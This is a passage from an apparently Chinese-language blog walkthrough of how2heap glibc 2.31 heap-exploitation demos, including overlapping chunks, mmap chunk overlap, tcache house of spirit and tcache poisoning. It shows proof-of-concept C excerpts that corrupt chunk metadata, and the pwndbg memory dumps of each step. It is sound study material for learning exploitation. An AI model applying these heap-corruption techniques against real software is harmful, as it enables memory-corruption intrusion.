%p\n&quot;</span>,&amp;target,(<span class="keyword">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-overlapping-chunks"><a href="#6-overlapping-chunks" class="headerlink" title="6. overlapping_chunks"></a>6. overlapping_chunks</h3><p>通过修改 size 造成堆重叠，然后拿到两个指针指向同一个 chunk</p><p>构造如下 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x80</span>                 Used                None              None</span><br><span class="line"><span class="number">0x555555559310</span>      <span class="number">0x3131313131313131</span>  <span class="number">0x500</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559810</span>      <span class="number">0x3232323232323232</span>  <span class="number">0x80</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>p1 是 大小 0x80 的chunk， p2 是大小为 0x500 的chunk ，p3 是大小为 0x80 的chuk</p><p>然后修改 p2 的大小 为 p2 +p 3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">44</span> <span class="comment">/* VULNERABILITY */</span></span><br><span class="line">► <span class="number">45</span> *(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line">  <span class="number">46</span> <span class="comment">/* VULNERABILITY */</span></span><br></pre></td></tr></table></figure><p>再然后释放 p2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">48</span> <span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">► <span class="number">49</span> <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="number">50</span> <span class="built_in">printf</span>(<span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>再分配一个新的 大小符合修改之后的  chunk， 可以把 修改完 chunk 之后的 p2+p3 重新分配回来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">56</span> p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"> ► <span class="number">58</span> <span class="built_in">printf</span>(<span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line">   <span class="number">59</span> <span class="built_in">printf</span>(<span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line">   <span class="number">60</span> <span class="built_in">printf</span>(<span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line">   <span class="number">61</span></span><br><span class="line">   <span class="number">62</span> <span class="built_in">printf</span>(<span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">   <span class="number">63</span>    <span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffe280 —▸ 0x7fffffffe3b8 —▸ 0x7fffffffe633 ◂— &#x27;/media/psf/Home/Downloads/how2heap/glibc_2.31/overlapping_chunks&#x27;</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe288</span> ◂— <span class="number">0x15555556d</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe290</span> —▸ <span class="number">0x7ffff7fb5fc8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe298</span> ◂— <span class="number">0x57800000581</span></span><br><span class="line">04:0020│      0x7fffffffe2a0 —▸ 0x5555555592a0 ◂— 0x3131313131313131 (&#x27;11111111&#x27;)</span><br><span class="line">05:0028│      0x7fffffffe2a8 —▸ 0x555555559320 ◂— 0x3232323232323232 (&#x27;22222222&#x27;)</span><br><span class="line">06:0030│      0x7fffffffe2b0 —▸ 0x555555559820 ◂— 0x3333333333333333 (&#x27;33333333&#x27;)</span><br><span class="line">07:0038│      0x7fffffffe2b8 —▸ 0x555555559320 ◂— 0x3232323232323232 (&#x27;22222222&#x27;)</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">555555555390</span> main+<span class="number">359</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p p4+evil_region_size</span><br><span class="line">$<span class="number">9</span> = (<span class="keyword">long</span> *) <span class="number">0x55555555bee0</span></span><br><span class="line">pwndbg&gt; p p3+<span class="number">0x580</span><span class="number">-8</span></span><br><span class="line">$<span class="number">10</span> = (<span class="keyword">long</span> *) <span class="number">0x55555555c3e0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>我们就会发现 p4 和 p3 重叠了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope p3</span><br><span class="line">00:0000│ rax rdi  0x555555559820 ◂— 0x3333333333333333 (&#x27;33333333&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope p4</span><br><span class="line">00:0000│   0x555555559320 ◂— 0x3434343434343434 (&#x27;44444444&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; hexdump <span class="number">0x555555559320</span> <span class="number">0x400</span></span><br><span class="line">+<span class="number">0000</span> <span class="number">0x555555559320</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  │<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│</span><br><span class="line">...</span><br><span class="line">pwndbg&gt;</span><br><span class="line">+<span class="number">0020</span> <span class="number">0x555555559720</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  │<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│</span><br><span class="line">...</span><br><span class="line">+<span class="number">0120</span> <span class="number">0x555555559820</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">33</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  │<span class="number">3333</span>│<span class="number">3333</span>│<span class="number">3333</span>│<span class="number">3333</span>│</span><br><span class="line">...</span><br><span class="line">+<span class="number">0170</span> <span class="number">0x555555559870</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  │<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│<span class="number">4444</span>│</span><br><span class="line">...</span><br><span class="line">+<span class="number">0190</span> <span class="number">0x555555559890</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">34</span> <span class="number">34</span> <span class="number">34</span> <span class="number">34</span>  <span class="number">71</span> <span class="number">07</span> <span class="number">02</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │<span class="number">4444</span>│<span class="number">4444</span>│q...│....│</span><br><span class="line">+<span class="number">01</span>a0 <span class="number">0x5555555598a0</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h3 id="7-mmap-overlapping-chunks"><a href="#7-mmap-overlapping-chunks" class="headerlink" title="7. mmap_overlapping_chunks"></a>7. mmap_overlapping_chunks</h3><pre><code>    GLibC中的Mmap chunks入门知识    ==================================在GLibC中，有一个点，当一个分配是如此之大，以至于malloc决定我们需要一个单独的内存部分来处理它，而不是在正常的堆上分配它。这是由 mmap_threshold var.代替正常的获取块的逻辑，系统调用 Mmap。这将分配一段虚拟内存，并把它还给用户。同样，释放过程也会有所不同。释放的块不是还给一个bin或堆的其他部分，而是使用另一个syscall。*Munmap*. 它接收一个先前分配的Mmap块的指针，并将其释放回内核。Mmap chunks在大小元数据上有一个特殊的位：第二位。如果这个位被设置，那么这个块就被分配为一个Mmap块。Mmap分块有一个prev_size和一个size。大小*代表当前的 分块的大小。一个chunk的*prev_size*表示剩余的空间。的大小（不是直接低于大小的分块）。然而，fd和bk指针并没有被使用，因为Mmap chunks并没有返回到 的大小，就像GLibC Malloc中的大多数堆块一样。释放后， 分块必须是页面对齐的。下面的POC本质上是一个重叠的chunk攻击，但在mmap chunks上。这和https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c 非常相似。主要的区别是，mmapped chunks有特殊的属性，并且是 以不同的方式处理，创造出与正常情况下不同的攻击场景。重叠的分块攻击。还可以做其他的事情。如munmapping系统库、堆本身和其他东西。这只是一个简单的概念证明，目的是为了证明一般的 的方法来执行对 mmap 分块的攻击。 关于GLibC中mmap chunks的更多信息，请阅读这篇文章。http://tukan.farm/2016/07/27/munmap-madness/</code></pre><p>首先使用 malloc 分配几个大的 chunk :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">57</span> <span class="keyword">long</span> <span class="keyword">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">58</span> <span class="built_in">printf</span>(<span class="string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);</span><br><span class="line">  <span class="number">59</span></span><br><span class="line">  <span class="number">60</span> <span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">► <span class="number">61</span> <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">62</span> <span class="built_in">printf</span>(<span class="string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line">  <span class="number">63</span></span><br><span class="line">  <span class="number">64</span> <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">65</span> <span class="built_in">printf</span>(<span class="string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);</span><br></pre></td></tr></table></figure><p>此时我们可以知道 mmap_chunk_3 的 preve size 和 size 分别为： 0 和 0x101002</p><p>假设我们此时有一个漏洞可以修改 preve_size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">88</span> <span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">  <span class="number">89</span> <span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">► <span class="number">90</span> mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">  <span class="number">91</span> <span class="built_in">printf</span>(<span class="string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">  <span class="number">92</span> <span class="built_in">printf</span>(<span class="string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);</span><br><span class="line">  <span class="number">93</span></span><br><span class="line">  <span class="number">94</span> <span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>我们将 prev_size 修改为 0x202002 , 然后我们 free mmap_chunk_3 , </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">102</span> Because of <span class="keyword">this</span> added restriction, the main goal is to get the memory back from the system</span><br><span class="line">  <span class="number">103</span> to have two pointers assigned to the same location.</span><br><span class="line">  <span class="number">104</span> */</span><br><span class="line">  <span class="number">105</span> <span class="comment">// Munmaps both the second and third pointers</span></span><br><span class="line">► <span class="number">106</span> <span class="built_in">free</span>(mmap_chunk_3);</span><br><span class="line">  <span class="number">107</span></span><br><span class="line">  <span class="number">108</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  109 Would crash, if on the following:</span></span><br><span class="line"><span class="comment">  110 mmap_chunk_2[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="comment">  111 This is because the memory would not be allocated to the current program.</span></span><br></pre></td></tr></table></figure><p>这个时候我们再 malloc 一个大小 0x300000 ， 由于前面发生的合并，所以我们会得到一个 重叠的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">120</span> <span class="built_in">printf</span>(<span class="string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);</span><br><span class="line">   <span class="number">121</span> <span class="built_in">printf</span>(<span class="string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);</span><br><span class="line">   <span class="number">122</span> <span class="keyword">long</span> <span class="keyword">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line"> ► <span class="number">123</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">   <span class="number">124</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line">   <span class="number">125</span></span><br><span class="line">     ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">     pwndbg&gt; p overlapping_chunk</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">long</span> <span class="keyword">long</span> *) <span class="number">0x7f78b3e60010</span></span><br><span class="line">pwndbg&gt; p/x overlapping_chunk[<span class="number">-1</span>]</span><br><span class="line">$<span class="number">8</span> = <span class="number">0x301002</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们修改 overlapping_chunk 的数据内容的同时，就是把 mmap_chunk_2 的值修改了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">135</span> <span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line"> ► <span class="number">136</span> <span class="built_in">printf</span>(<span class="string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">137</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">   <span class="number">138</span> <span class="built_in">printf</span>(<span class="string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);</span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p/x mmap_chunk_2[<span class="number">0</span>]</span><br><span class="line">$<span class="number">14</span> = <span class="number">0x1122334455667788</span></span><br></pre></td></tr></table></figure><h3 id="8-tcache-house-of-spirit"><a href="#8-tcache-house-of-spirit" class="headerlink" title="8. tcache_house_of_spirit"></a>8. tcache_house_of_spirit</h3><p>首先 malloc 一个 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span> <span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line">  <span class="number">13</span></span><br><span class="line">  <span class="number">14</span> <span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">15</span></span><br><span class="line">  <span class="number">16</span></span><br><span class="line">► <span class="number">17</span> <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">  <span class="number">18</span> <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">  <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>此时在栈上我们有一个可控目标</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="number">21</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="number">22</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br></pre></td></tr></table></figure><p>将这个可控目标伪造成一个一个chunk ，修改其大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">28</span> fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br></pre></td></tr></table></figure><p>free 这个伪造的 chunk ，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">34</span> a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">  <span class="number">35</span></span><br><span class="line">  <span class="number">36</span> <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">37</span> <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">38</span></span><br></pre></td></tr></table></figure><p>我们就会发现，在 tcache 上有一个栈地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x7ffe02d9aa00</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>此时，我们再malloc 一次，就能把这个栈地址拿回来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /pwn/tcache_house_of_spirit.c</span><br><span class="line">   <span class="number">38</span></span><br><span class="line">   <span class="number">39</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">40</span> <span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">   <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line">   <span class="number">42</span></span><br><span class="line"> ► <span class="number">43</span> assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">44</span> &#125;</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7ffe02d9a9e0</span> —▸ <span class="number">0x7ffe02d9aa00</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7ffe02d9a9f0</span> —▸ <span class="number">0x55c7abd8f040</span> ◂— <span class="number">0x400000006</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7ffe02d9a9f8</span> ◂— <span class="number">0x40</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7ffe02d9aa00</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7ffe02d9aa10</span> —▸ <span class="number">0x7ffe02d9aa36</span> ◂— <span class="number">0x55c7abd901200000</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7ffe02d9aa18</span> —▸ <span class="number">0x55c7abd9040d</span> (__libc_csu_init+<span class="number">77</span>) ◂— add    rbx, <span class="number">1</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55</span>c7abd90368 main+<span class="number">351</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>432c2890b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">void</span> *) <span class="number">0x7ffe02d9aa00</span></span><br></pre></td></tr></table></figure><h3 id="9-tcache-poisoning"><a href="#9-tcache-poisoning" class="headerlink" title="9. tcache_poisoning"></a>9. tcache_poisoning</h3><p>通过劫持修改  tcache fd 的形式来，来获取一个目标地址,  这里的目标是一个栈地址， 作用于 8 挺相似的</p><p>malloc 两个 chunk ，分别为 a 和 b</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">21</span> <span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">  <span class="number">22</span> <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">  <span class="number">23</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">  <span class="number">24</span> <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">► <span class="number">25</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br></pre></td></tr></table></figure><p>然后再一次将他们 free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">27</span> <span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">   <span class="number">28</span> <span class="built_in">free</span>(a);</span><br><span class="line">   <span class="number">29</span> <span class="built_in">free</span>(b);</span><br><span class="line">   <span 